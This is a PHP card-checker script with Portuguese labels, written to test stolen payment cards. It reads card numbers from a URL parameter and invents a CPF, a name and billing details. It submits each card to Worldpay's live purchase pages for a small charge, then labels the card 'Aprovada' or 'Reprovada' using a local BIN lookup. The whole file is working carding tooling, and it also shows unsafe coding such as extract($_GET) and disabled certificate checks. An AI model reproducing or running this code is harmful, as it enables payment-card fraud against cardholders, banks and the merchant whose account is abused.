<?php
extract($_GET);
error_reporting(0);
date_default_timezone_set('Brazil/East');
DeletarCookies();
$randCookie = rand(100000000,999999999);
$loadtime = time();

function deletarCookies() {
    if (file_exists("functioncookie.txt")) {
        unlink("functioncookie.txt");
    }
}
function multiexplode ($delimiters,$string){
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;}

function getStr2($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = $_GET['lista'];
$lista = str_replace(" ", "", $lista);
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$lista);
$cc = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];


$number1 = substr($cc,0,4);
$number2 = substr($cc,4,4);
$number3 = substr($cc,8,4);
$number4 = substr($cc,12,4);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

function cpf($compontos)
{
    $n1 = rand(0,9);
    $n2 = rand(0,9);
    $n3 = rand(0,9);
    $n4 = rand(0,9);
    $n5 = rand(0,9);
    $n6 = rand(0,9);
    $n7 = rand(0,9);
    $n8 = rand(0,9);
    $n9 = rand(0,9);
    $d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
    $d1 = 11 - ( mod($d1,11) );

    if ( $d1 >= 10 )
    { 
        $d1 = 0 ;
    }

    $d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
    $d2 = 11 - ( mod($d2,11) );

    if ($d2>=10) 
    {
        $d2 = 0 ;
    }
    $retorno = '';
    if ($compontos==1) 
    {
        $retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;
    }
    return $retorno;
}


function dadosnome()
{
    $nome = file("lista_nomes.txt");
    $mynome = rand(0, sizeof($nome)-1);
    $nome = $nome[$mynome];
    return $nome;
}
function dadossobre()
{
    $sobrenome = file("lista_sobrenomes.txt");
    $mysobrenome = rand(0, sizeof($sobrenome)-1);
    $sobrenome = $sobrenome[$mysobrenome];
    return $sobrenome;
}


function email($nome)
{
    $email = preg_replace('<\W+>', "", $nome).rand(0000,9999)."@hotmail.com";
    return $email;
}



$cpf = cpf(1);
$nome = dadosnome();
$sobrenome = dadossobre();
$email = email($nome);
$random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 8)), 0, 8);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase?instId=258437&testMode=0&cartId=1&currency=GBP&amount=1.00");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'X-Requested-With: XMLHttpRequest',
'Connection: Keep-Alive'
));

curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 0); 
curl_setopt($ch, CURLOPT_REFERER, '');
$a = curl_exec($ch);

$PaymentID = value($a, 'NAME=PaymentID VALUE="','"');


#==================================================================================================================

curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'X-Requested-With: XMLHttpRequest',
'Connection: Keep-Alive'
));

curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 0); 
curl_setopt($ch, CURLOPT_REFERER, '');
curl_setopt($ch, CURLOPT_POSTFIELDS, "PaymentID=".$PaymentID."&Lang=pt&authCurrency=GBP&op-DPChoose-VISA%5ESSL.x=37&op-DPChoose-VISA%5ESSL.y=18");

$b = curl_exec($ch);

#===================================================================================================================================

curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/card");
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'X-Requested-With: XMLHttpRequest',
'Connection: Keep-Alive'
));

curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 0); 
curl_setopt($ch, CURLOPT_REFERER, '');
curl_setopt($ch, CURLOPT_POSTFIELDS, "PaymentID=".$PaymentID."&Lang=pt&cardNoInput=".$cc."&cardNoJS=&cardNoHidden=*oculto*&cardCVV=000&cardExp.day=32&cardExp.time=23%3A59%3A59&cardExp.month=12&cardExp.year=".$ano."&name=".$random."&address1=STREET+".$random."&address2=".$random."&address3=".$random."&town=SP&region=SP&postcode=".$random."&country=BR&tel=".$random."&fax=12412421&email=".$random."%40GMAIL.COM&op-PMMakePayment.x=-77&op-PMMakePayment.y=22");

$pagamento = curl_exec($ch);





if($cbin == "6")//DISCOVER
{
    $cbin = "<font color='gray'><i class='fa fa-cc-discover' aria-hidden='true'></i></font>";
}
else if($cbin == "5")//MASTERCARD
{
    $cbin = "<font color='red'><i class='fa fa-cc-mastercard' aria-hidden='true'></i></font>";
}
else if($cbin == "4")//VISA
{
    $cbin = "<font color='blue'><i class='fa fa-cc-visa' aria-hidden='true'></i></font>";
}
else if($cbin == "3")//AMEX
{
    $cbin = "<font color='gold'><i class='fa fa-cc-amex' aria-hidden='true'></i></font>";
}

else if($cbin == "0")
{
    $cbin = "<font color='red'>✘</font>";
}
else if($cbin == "1")
{
    $cbin = "<font color='red'>✘</font>";
}
else if($cbin == "2")
{
    $cbin = "<font color='red'>✘</font>";
}
else if($cbin == "8")
{
    $cbin = "<font color='red'>✘</font>";
}
else if($cbin == "9")
{
    $cbin = "<font color='red'>✘</font>";
}

#-----------------------------------------------------------------------------------------------------------------------------------------#
$valores = array('R$ 1,00','R$ 5,00','R$ 1,40','R$ 4,80','R$ 2,00','R$ 7,00','R$ 10,00','R$ 3,00','R$ 3,40','R$ 5,50');
$debitouu = $valores[mt_rand(0,9)];

#-----------------------------------------------------------------------------------------------------------------------------------------#

if (strpos($pagamento, 'https://www66.bb.com.br/SecureCodeAuth') || strpos($pagamento, 'auth.bb'))
{
    $bin = substr($cc, 0, 6);
    $file = 'bins.csv';
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";

    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }

    $pieces = explode(";", $encontrada);
    $c = count($pieces);

    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];

    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
echo '<font  color="lime">#Aprovada  '.$lista.' | [ Bandeira: '.$bandeira.' | Banco: '.$banco.' | Level: '.$level.' | Pais: '.$pais.' ('.$paiscode.') ] DEBITOU :'.$debitouu.'  [PAGAMENTO CONCLUIDO] </font><br></font><br>';
}
elseif(strpos($pagamento, "Submission Error"))
{
    $bin = substr($cc, 0, 6);
    $file = 'bins.csv';
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";

    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }

    $pieces = explode(";", $encontrada);
    $c = count($pieces);

    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];

    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
    echo '<font  color="red">#Reprovada  '.$lista.' | [ Bandeira: '.$bandeira.' | Banco: '.$banco.' | Level: '.$level.' | Pais: '.$pais.' ('.$paiscode.') ] RECUSOU :'.$debitouu.'  [PAGAMENTO RECUSADO] </font><br></font><br>';
}else
{
    $bin = substr($cc, 0, 6);
    $file = 'bins.csv';
    $searchfor = $bin;
    $contents = file_get_contents($file);
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";

    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }

    $pieces = explode(";", $encontrada);
    $c = count($pieces);

    if ($c == 8) {
        $pais = $pieces[4];
        $paiscode = $pieces[5];
        $banco = $pieces[2];
        $level = $pieces[3];
        $bandeira = $pieces[1];

    } else {
        $pais = $pieces[5];
        $paiscode = $pieces[6];
        $level = $pieces[4];
        $banco = $pieces[2];
        $bandeira = $pieces[1];
    }
    echo '<font  color="red">#Reprovada  '.$lista.' | [ Bandeira: '.$bandeira.' | Banco: '.$banco.' | Level: '.$level.' | Pais: '.$pais.' ('.$paiscode.') ] RECUSOU :'.$debitouu.'  [PAGAMENTO RECUSADO] </font><br></font><br>';
}
curl_close($ch);
ob_flush();

?>